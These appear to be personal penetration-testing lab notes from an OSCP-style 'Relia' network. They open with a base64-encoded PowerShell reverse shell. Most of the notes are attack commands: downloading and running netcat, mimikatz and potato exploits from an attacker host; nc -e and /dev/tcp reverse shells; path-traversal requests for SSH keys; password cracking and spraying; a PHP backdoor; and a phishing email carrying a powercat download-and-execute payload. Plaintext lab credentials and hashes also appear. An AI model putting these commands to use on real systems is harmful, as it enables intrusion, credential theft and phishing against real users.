JExIT1NUID0gIjE5Mi4xNjguNDUuMTY2IjsgJExQT1JUID0gNjY2NjsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ=="

> "certutil -urlcache -f http://192.168.45.166:8000/nc.exe c:/windows/temp/nc.exe";--
>c:\windows\temp\nc.exe 192.168.45.166 6666 -e cmd.exe

# Hint - https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py chat link Discord 
>python3 mkpsrevshell.py 192.168.45.189 6666       
#Above github link generated a payload                                                                            
powershell -e JABj....................AApAA==
kali>nc -lnvp 6666

> python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c powershell.exe -a "-e JABj...........AApAA=="
kali>whoami
#Got shell 
>iwr -uri http://192.168.45.189:8000/DeadPotato-NET4.exe -Outfile DeadPotato-NET4.exe
>iwr -uri http://192.168.45.189:8000/mimicatz.exe -Outfile mimicatz.exe
>iwr -uri http://192.168.45.208:8000/winPEASx64.exe -Outfile winPEASx64.exe
>iwr -uri http://192.168.45.189:8000/Lagent.exe -Outfile Lagent.exe

>net user (# Found new user - zachary)
> iwr -uri http://192.168.45.208:8000/PowerView.ps1 -Outfile PowerView.ps1
#PS C:\Windows\Temp> ls
    Directory: C:\Windows\Temp
> Invoke-Module .\PowerView.ps1
> Find-LocalAdminAccess
> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
> Get-NetUser
> Get-NetUser
#Active Directory commands are not working.
> net user (# Working new user find zachary)

#Search windows .txt files in powershell using Get-ChildItem
>Get-ChildItem -Path C:\Users -Filter *.txt -Recurse 
#Proof.txt
> type C:\xampp\webdav\webdav.txt                     
URL: http://localhost/webdav/
User: wampp Password: xampp
E-Mail-Adresse bei Dreamweaver angeben. 
Lokales Directory: /xampp/webdav/

#Tring to RUN the winPEAS but not running since one hour, seek for hint
#Hint - Consider getting an interactive shell using conptyshell

#ConptyShell (https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) Usage (https://github.com/antonioCoco/ConPtyShell)
>iwr -uri http://192.168.45.189:8000/Invoke-ConPtyShell.ps1 -Outfile Invoke-ConPtyShell.ps1

#Server Side - Kali
>stty raw -echo; (stty size; cat) | nc -lvnp 3001

#CLient  Side - Target 
>Invoke-ConPtyShell 192.168.45.189 3001 
#Not worked
>Remove-Item Invoke-ConPtyShell.ps1 

>stty raw -echo; (stty size; cat) | nc -lvnp 3001
>IEX(IWR http://192.168.45.189:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.45.189 -RemotePort 3001 -Rows 24 -Cols 80
# This time it worked but,

 When RUN ls command output printing takes 5 minutes 
 
 >iwr -uri http://192.168.45.189:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 
 EXITed from this no information as per offsec SME
 
 
 192.168.223.248
 
 
 >smbclient -L //192.168.223.248
 >smb: \log\....\>get web.config
 #web.config file has credentials 
 
 #Database.kdbx file  (\logs\build\materials\assets\Databases\> get Database.kdbx )
 >keepass2john Database.kdbx > keepass.hash
! Database.kdbx : Unknown format: File signature invalid
#It's invalid signature

>smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx
#Deleted Previous file
>keepass2john Database.kdbx > keepass.hash
>hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
>john keepass.hash

#Crackmapexec with all ftp, ssh, smb, mssql, rdp, ldap, winr,
>crackmapexec rdp 192.168.161.189-250 -u users.txt -p pass.txt --continue-on-success
>netexec mssql 192.168.161.189-250 -u users.txt -p pass.txt --continue-on-success

>xfreerdp /u:emma /p:welcome1 /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore with /d:external , /d:external.relia.com
>hydra -L users.txt -P pass.txt 192.168.243.248 rdp
>nxc rdp 192.168.243.248 -u users.txt -p pass.txt
>crackmapexec rdp 192.168.243.248 -u emma -p welcome1 
>nxc rdp 192.168.243.248 -u emma -p welcome1 

#Hint - Right, open the kdbx file with the password you got. You can use kpcli
>kpcli --kdb=Database.kdbx (#Password - welcome)
>ls
>cd Databases
>cd Windows
>show emma
#Password show in hide RED, select with mouse it will unhide multiple times. 

>xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore
#Got the shell

```

### Relia - 192.168.243.248 - Betamonitor, SSH file with different names

```jsx
>xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore
#Got the shell

#Start priv Esc

> iwr -uri http://192.168.45.208:8000/winPEASx64.exe -Outfile winPEASx64.exe
PS C:\Users\emma> iwr -uri http://192.168.45.208:8000/PowerView.ps1 -Outfile PowerView.ps1
> iwr -uri http://192.168.45.208:8000/nc.exe -Outfile nc.exe

#Windows
>.\nc.exe 192.168.45.208 6666 -e cmd.exe

#kali
>nc -nlvp 6666
>.\winPEASx64.exe

Revealed some information
#dev.testlab.local  (TESTLAB\dfm.a - Password123!)
#external.local
#prod.testlab.local
#windows1.testlab.local, windows2.testlab.local

#Unquoted path  
C:\Program Files (x86)\Microsoft\Edge\Application\107.0.1418.26\Installer\setup.exe
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini 

#Scheduled Applications --Non Microsoft--
Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
(Administrator) BetaTask: C:\BetaMonitor\BetaMonitor.exe 

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe -o met4444.exe
> iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met.exe
>C:\BetaMonitor
#Unable move the file neither of this GUI and cli
>Hint - dir env:
#AppKey value - !8@aBRBYdb3! (# I think this password for admin, while used for moving BetaMonitor.exe file, But not worked)

#Hint - you should check the "log" and see what you find more and follow the "puzzle" -> you should do a dir on the env and you will loot something good

#Hint - Have your read the log file yet? C:\BetaMonitor\BetaMonitor.log  that gives you clues for the next step. Also, carefully read the shared message again that gives you the command that you may want to use as a next step.

# Coudln't find BetaLibrary.Dll.
>x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll   
# Error - x86_64-w64-mingw32-gcc: fatal error: cannot execute ‘cc1plus’: execvp: No such file or directory
compilation terminated.
                           
#Solved
>sudo apt-get install g++-mingw-w64

>iwr -uri http://192.168.45.189:8000/file.dll -Outfile file.dll
#Unable move the file into C:\BetaMonitor\ path.

PS C:\BetaMonitor> icacls .\BetaMonitor.exe
.\BetaMonitor.exe BUILTIN\Users:(I)(RX)
                  NT AUTHORITY\SYSTEM:(I)(F)
                  BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files

#Hint - Add ENV: “ !8@aBRBYdb3! ” into the password file try rdp
>xfreerdp /u:mark /p:'!8@aBRBYdb3! ' /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore

#Got access to Administrator group with mark user, but not admin

 192.168.223.249
 
locate .nse | grep smb
nmap -p445 --script="name" 192.168.239.249

>crackmapexec rdp 192.168.239.249,246 -u users.txt -p pass.txt  --continue-on-success
>hydra -L users.txt -P pass.txt 192.168.239.249 rdp
#No hit 

>./50383.sh ip.txt /etc/passwd (All IPs here 189,191,245,246,247,248,249,250)

#for 245 identified new uses (miranda, steven, mark, anita,offsec)

>hydra -L users.txt -P pass.txt 192.168.239.245 ssh -s 2222
#Doesn't support password authentication, May be try identifying ssh key in the user folders.
#No keys are avaliable

>./50383.sh ip.txt /home/anita/local.txt (# Got flag, mean anita active user)

#Tried this one for shell (https://github.com/thehackersbrain/CVE-2021-41773)  Not successful
>python3 exploit.py -t 192.168.239.245 (Exploit renamed as CVE-2021-41773) 

>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'  (passwd)

#Hint - The private key might have a different name, you can check this resource: https://askubuntu.com/questions/30788/does-ssh-key-need-to-be-named-id-rsa
(id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk)

>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa' 

>ssh -i anita245_id_ecdsa anita@192.168.239.245 -p 2222
#Asking for password let's crack using ssh2john

anita245_id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa'  | base64
>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa'  | based64 > anita245_id_ecdsa 

#Remove name of after that that it will look like this
$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

>ssh2john anita245_id_ecdsa > anita245_id_ecdsa.hash

>john anita245_id_ecdsa.hash  (fireball)
>ssh -i anita245_id_ecdsa anita@192.168.239.245 -p 2222
#Logged IN

>sudo -l (No password for anita)
>wget http://192.168.45.189:8000/linpeas.sh 
>./linpeas.sh
```

### Relia - 192.168.239.245 - CVE-2021-3156 sudo Baron Samedit

```jsx
>john anita245_id_ecdsa.hash  (fireball)
>ssh -i anita245_id_ecdsa anita@192.168.239.245 -p 2222
#Logged IN

>sudo -l (No password for anita)
>wget http://192.168.45.189:8000/linpeas.sh 
>./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                     

[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
>└─$ gcc CVE-2022-2586.c -o exploit -lmnl -lnftnl -no-pie -lpthread
CVE-2022-2586.c:37:10: fatal error: libnftnl/chain.h: No such file or directory
   37 | #include <libnftnl/chain.h>
      |          ^~~~~~~~~~~~~~~~~~
compilation terminated.
   
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   #https://www.exploit-db.com/exploits/50689
   $ ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
#Need to be update libc6-dev Don't have access to sudo.

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
#49521.py ran the file generated some output but finally no ROOT   
   
[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
>gcc 49522.c -o 49522 #Error while generating the file
>gcc 49522.c -o 49522 -lmnl -lnftnl -no-pie -lpthread 
   
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
  https://github.com/theori-io/CVE-2022-32250-exploit
  >gcc exp.c -o exp -l mnl -l nftnl -w   #Error -exp.c:11:10: fatal error: libmnl/libmnl.h: No such file or directory
   11 | #include <libmnl/libmnl.h>

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   https://medium.com/r3d-buck3t/overwriting-preload-libraries-to-gain-root-linux-privesc-77c87b5f3bf8 code https://www.exploit-db.com/exploits/41154
   #NO ROOTSHELL

#https://juggernaut-sec.com/cron-jobs-lpe/ (Still Anita user)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                 
/usr/bin/crontab                                                                                                                                                       
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab                                                                                                               

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Oct 12  2022 .
drwxr-xr-x 98 root root 4096 Oct 28  2022 ..
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  191 Apr 23  2020 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Oct 12  2022 .
drwxr-xr-x 98 root root 4096 Oct 28  2022 ..
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common

I tried the things LINUX EXPLOIT SUGGESTERS nohing worked

I tried this "CVE-2021-3156" one, generated some data, finally land on same user anita my sudo version - Sudo version 1.8.31
#Hint - Try this  https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py

>./exploit_nss.py (#Got root shell)

#As per Offsec chat not inthe box

>ssh -i anita245_id_ecdsa anita@192.168.239.246 -p 2222 (fireball)

```

### Relia - 192.168.191.246 - pkexec, ssh

```jsx
>ssh -i anita245_id_ecdsa anita@192.168.239.246 -p 2222 (fireball)

>bash -i >& /dev/tcp/192.168.45.189/4455 0>&1
>nc -nlvp 4455
#Not worked get interactive shell

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                     
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)            
# https://github.com/theori-io/CVE-2022-32250-exploit  (Leak Failed)

[+] [CVE-2022-2586] nft_object UAF
 # https://github.com/aels/CVE-2022-2586-LPE (Leak Failed)

[+] [CVE-2022-0847] DirtyPipe
   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
   >https://github.com/n3rada/DirtyPipe

[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
 # based on that created searchsploit command
>searchsploit "linux kernel Ubuntu 22 Local Privilege Escalation"   | grep  "5." | grep -v " < 5.15.0" | grep -v "4.8"
# Found 2 exploits, first not root shell, 2 nd one compliation error

#Hint - Look at Linux PrivEsc Course, Check for ports open using ss -lntp, 

>ss -lntp (Apart from NMAP open ports, port 8000 is open menas /var/www/internal)
#But can't rearch from Firefoc http://192.168.153.246:8000/

>cd /var/www/internal
>ls -l (#Files are created by root)
>echo 'Ashok testing for writable permission' > ashok.txt
# Their is no writable -sh: 22: cannot create ashok.txt: Permission denied

#https://www.revshells.com/ (PHP PentestMoney), generated a payload.
>find / -writable -type d 2>/dev/null 
#Initially copied to /tmp, heraed in the chat /tmp has only read permission apart from that nc not having -e option for reverse shell, changed to /dev/shm

>wget http://192.168.45.189:8000/phpshell.php
>curl 'http://127.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd'
>curl 'http://127.0.0.1:8000/backend/?view=../../../../../../../../dev/shm/phpshell.php'

#Got a shell using for www-data
>rlwrap nc -nlvp 6666

#Instead of this you can try ssh -L 8000:127.0.0.1:8000 -o "UserKnownHostsFile=/dev/null" -i id_ecdsa anita@192.168.237.246 -p 2222

>cat /etc/issue
>uname -a
>find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh - NO from Gtfonins
/usr/bin/pkexec -
/usr/bin/mount                                                                                                                                                         
/usr/bin/chfn                                                                                                                                                          
/usr/bin/su                                                                                                                                                            
/usr/bin/passwd                                                                                                                                                        
/usr/bin/newgrp                                                                                                                                                        
/usr/bin/umount                                                                                                                                                        
/usr/bin/fusermount3                                                                                                                                                   
/usr/bin/gpasswd                                                                                                                                                       
/usr/bin/sudo  

>sudo pkexec /bin/sh
# Some gap tried ENTER
>id  (# Got root)

#189,191,249 IPs with SMB, rdp
>crackmapexec smb 192.168.153.249 -u users.txt -p pass.txt --continue-on-success
>smbclient -L //192.168.153.189 or ////
# INformation moving forward

#Enumerate http ports 189, 
=191 - 80 auth, 
> xfreerdp /u:offsec /p:lab /v:192.168.153.249 /smart-sizing:1920x1080 /cert-ignore (191,249)
 

```

### Relia - 192.168.153.249  - Php file upload, git show.

```jsx
#Next his one sawin the chat and basic information from website port 8000

>xfreerdp /u:offsec /p:lab /v:192.168.153.249 /smart-sizing:1920x1080 /cert-ignore

>http://192.168.153.249:8000/dashboard/phpinfo.php
User - adrian

#Hint - there is another webserver running on a higher port, u need to enumerate that webserver instead

>whatweb http://192.168.179.249:8000/

>gobuster dir -u http://192.168.179.249:8000/ -w /usr/share/wordlists/dirb/big.txt
#Found - CMS, img, dashboard, xampp

#Hint - Try taking a look at the following PoC: https://www.exploit-db.com/exploits/50616
I tried both ritecms.v3.1.0/admin.php/admin.php any clue from here
#Hint - /cms/admin.php

#As per POC 50616 http://192.168.232.249:8000/cms/admin.php (Logged in with admin:admin credentials, tried some other)

Payload revshells.com (PHP PentestMonkey) payload
>http://192.168.232.249:8000/cms/media/phpshell.pHP
#Error Mad me uploaded Linux shell uname error.

#Logged as adrian user
>curl  “http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=type%20C:\Users\adrian\Desktop\local.txt”
>curl "http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=whoami%20/priv"

Privilege Name                                     Description                                                                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                                                          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication                         Enabled 
SeCreateGlobalPrivilege       Create global objects                    		                                          Enabled 

>certutil -urlcache -f http://192.168.45.236:8000/nc.exe c:/windows/temp/nc.exe
>curl "http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.45.236%3A8000%2Fnc.exe%20c%3A%2Fwindows%2Ftemp%2Fnc.exe"
>rlwrap nc -nlvp 6666
>curl "http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=c%3A%5Cwindows%5Ctemp%5Cnc.exe%20192.168.45.236%206666%20-e%20cmd.exe"

#No shell 
>dir /s /b C:/windows/temp/nc.exe working dir /s /b C:\Windows\ 
 
 # IN Browser URL
 #certutil -urlcache -f http://192.168.45.236:8000/nc.exe c:\Windows\Temp\nc.exe
 http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=certutil%20-urlcache%20-f%20http://192.168.45.236:8000/nc.exe%20c:\Windows\Temp\nc.exe
#Check in the user directory 
>dir /s /b C:\Users\adrian\Desktop\
 
 >certutil -urlcache -f http://192.168.45.237:8000/nc.exe C:\Users\adrian\Desktop\nc.exe
 >dir /s /b C:\Users\adrian\Desktop\
 #Got it 
 >C:\Users\adrian\Desktop\nc.exe
 >C:\Users\adrian\Desktop\nc.exe 192.168.45.236 6666 -e cmd.exe
 #Got shell rlwrap nc -nlvp 6666
 #SeImpersonatePrivilege
 >iwr -uri http://192.168.45.237:8000/DeadPotato-NET4.exe -Outfile DeadPotato.exe
 >certutil -urlcache -f http://192.168.45.237:8000/DeadPotato-NET4.exe C:\Users\adrian\Desktop\DeadPotato.exe
 
 >DeadPotato.exe -cmd “whoami”
 >DeadPotato.exe -rev 192.168.45.237:9001
 >rlwrap nc -nlvp 9001
 #Not worked above one
 PS>iwr -uri http://192.168.45.236:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell.exe
#
>.\DeadPotato.exe -newadmin ashok:Ashok@123
>net localgroup administrators
Members
-------------------------------------------------------------------------------
Administrator
ashok
damon
The command completed successfully.

# Create a PSCredential object with the username and password
$securePassword = ConvertTo-SecureString "Ashok@123" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("domain\ashok", $securePassword)
# Use Start-Process to run a command with the specified credentials
Start-Process "cmd.exe" -Credential $credential

# Domain
>systeminfo | findstr /B /C:"Domain"
>wmic computersystem get domain
>(Get-WmiObject Win32_ComputerSystem).Domain
>Test-Connection -ComputerName (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object -First 1 -ExpandProperty DNSDomain)

>xfreerdp /u:ashok /p:Ashok@123 /v:192.168.232.249 /smart-sizing:1920x1080 /cert-ignore
#Got it

 Lateral Movement
 C:\Users\damon\.gitconfig file has (C:\staging)
 >C:\staging\htdocs\cms\data\sql\sqlite_userdata_init.sql
 INSERT INTO "rite_userdata" VALUES (1, 'admin', 1, '3e250c2bfd46362687d3a871c12b50c7d558904b65860c1bf5', 1614826028, 1);
COMMIT;
#Git folder
>git log 
>git config --global --add safe.directory C:/staging
#Add into safe directory
>git show 8b430c17c16e6c0515e49c4eafdd129f719fde74 (#Showing commits)
#May be Credentials
#maildmz@relia.com:DPuBT9tGCBrTbR
#Mail server responsiable for - jim@relia.com, User damian

>iwr -uri http://192.168.45.236:8000/winPEASx64.exe -Outfile winPEASx64.exe
> .\winPEASx64.exe
NetNTLMv2
adrian::LEGACY:1122334455667788:b08935a4bff5b4b9e3bc9f9a832f32ca:0101000000000000feaedee93ef4da018edfb7f69b4f32a300000000080030003000000000000000000000000030000082146719f9ffcad0d6bb9cacafae10cb01091039deba7596c4015f26a793b0290a00100000000000000000000000000000000000090000000000000000000000

>iwr -uri http://192.168.45.236:8000/mimicatz.exe -Outfile mimicatz.exe
 Lateral Movement
 C:\Users\damon\.gitconfig file has (C:\staging)
 >C:\staging\htdocs\cms\data\sql\sqlite_userdata_init.sql
 INSERT INTO "rite_userdata" VALUES (1, 'admin', 1, '3e250c2bfd46362687d3a871c12b50c7d558904b65860c1bf5', 1614826028, 1);
COMMIT;
#Git folder
#Hint - After getting hashes notable to crack check the git log at C:\statging
>git log 
>git config --global --add safe.directory C:/staging
#Add into safe directory
>git show 8b430c17c16e6c0515e49c4eafdd129f719fde74 (#Showing commits)
#May be Credentials
#maildmz@relia.com:DPuBT9tGCBrTbR
#Mail server responsiable for - jim@relia.com, User damian

- Open the VisualStudio code open new text file paste below code (Enter KALI IP) save it.
- Double click to open the file(config file, created in above) include same config file.
- Include powershell shortcut(On Desktop RightClick -> New -> Shortcut -> (in open location place Include below powershell powercat download execute command), save it powershell).
- Now this folder has config file and powershell shortcut.
- Transfer this file to kali using ssh command below. 

## config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.247</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
##config.Library-ms

##copythis config.Library-ms into kali working directory
>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/HTB/OSCP/Relia/webdav
>sudo service ssh start
>scp .\config.Library-ms kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/
#Inter below command on windows shortcut name itinstall
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.247:8000/powercat.ps1'); powercat -c 192.168.45.247 -p 4444 -e powershell"
>nc -nlvp 4444
>sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.154.189 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
nc -nlvp 4444>whoami (relia\jim)
>hostname (WK01)
>ipconfig (172.16.158.14)
```

### Relia - 172.16.114.14 - Phishing mail with swaks,

```jsx
##copythis config.Library-ms into kali working directory (#in Win Prep Machine)
>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/HTB/OSCP/Relia/webdav
>sudo service ssh start
>scp .\config.Library-ms kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/
#Inter below command on windows shortcut name itinstall
